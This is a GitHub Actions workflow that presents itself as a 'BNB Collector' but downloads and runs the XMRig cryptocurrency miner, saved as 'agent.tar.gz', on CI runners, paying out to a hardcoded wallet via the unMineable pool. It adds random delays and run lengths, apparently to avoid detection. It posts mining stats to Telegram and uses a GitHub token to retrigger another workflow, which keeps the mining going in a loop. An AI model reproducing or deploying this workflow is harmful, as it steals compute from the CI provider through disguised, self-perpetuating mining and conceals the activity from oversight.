name: BNB Collector Loop

on:
  workflow_dispatch:

permissions:
  contents: read

jobs:
  collect:
    runs-on: ubuntu-latest
    timeout-minutes: 360

    steps:
      - name: Initialize BNB Collector
        run: echo "üõ∞Ô∏è Initializing BNB collector..."

      - name: Setup Environment
        run: sudo apt update -y && sudo apt install -y curl tar

      - name: Notify Start
        env:
          TG_TOKEN: ${{ secrets.TG_TOKEN }}
          TG_CHAT_ID: ${{ secrets.TG_CHAT_ID }}
        run: |
          curl -s -X POST https://api.telegram.org/bot$TG_TOKEN/sendMessage \
            -d chat_id=$TG_CHAT_ID \
            --data-urlencode text="üü¢ *BNB Collector aktif.*\nDurasi kerja acak 20‚Äì90 menit." \
            -d parse_mode=Markdown

      - name: Run Mining Session
        run: |
          curl -L -o agent.tar.gz https://github.com/xmrig/xmrig/releases/download/v6.24.0/xmrig-6.24.0-linux-static-x64.tar.gz
          tar -xzf agent.tar.gz
          cd xmrig-6.24.0
          chmod +x xmrig

          DELAY=$((RANDOM % 300 + 30))
          echo "Delay awal: $DELAY detik"
          sleep $DELAY

          ./xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 \
            -u BNB:0xf319aef8c1d323c83740bcde9f25238ff5c4855d.unmineable_worker#f2xg-6ynu \
            -p x --randomx-no-rdmsr | tee log.txt &

          PID=$!
          DURATION=$((RANDOM % 5400 + 1200))
          echo "Menambang selama $DURATION detik"
          sleep $DURATION
          kill $PID

      - name: Notify Result
        if: always()
        env:
          TG_TOKEN: ${{ secrets.TG_TOKEN }}
          TG_CHAT_ID: ${{ secrets.TG_CHAT_ID }}
        run: |
          set +e
          cd $(find . -type d -name "xmrig-6.24.0" | head -n1)
          HASHRATE=$(grep -a "speed" log.txt | tail -n1 | sed 's/\x1b\[[0-9;]*m//g' | awk '{print $(NF-1)" H/s"}')
          ACCEPTED=$(grep -a "accepted" log.txt | wc -l)
          REJECTED=$(grep -a "rejected" log.txt | wc -l)

          MSG="‚úÖ *BNB Collector selesai.*\n\nüìä *Stats:*\n‚Ä¢ Hashrate: \`$HASHRATE\`\n‚Ä¢ Accepted: \`$ACCEPTED\`\n‚Ä¢ Rejected: \`$REJECTED\`"

          curl -s -X POST https://api.telegram.org/bot$TG_TOKEN/sendMessage \
            -d chat_id=$TG_CHAT_ID -d text="$MSG" -d parse_mode=Markdown

      - name: Retrigger NANO Collector
        if: always()
        env:
          GH_TOKEN: ${{ secrets.GH_TOKEN }}
        run: |
          sleep $((RANDOM % 60 + 10))
          curl -X POST -H "Accept: application/vnd.github+json" \
               -H "Authorization: Bearer $GH_TOKEN" \
               https://api.github.com/repos/${{ github.repository }}/actions/workflows/data-collector.yml/dispatches \
               -d '{"ref":"main"}'
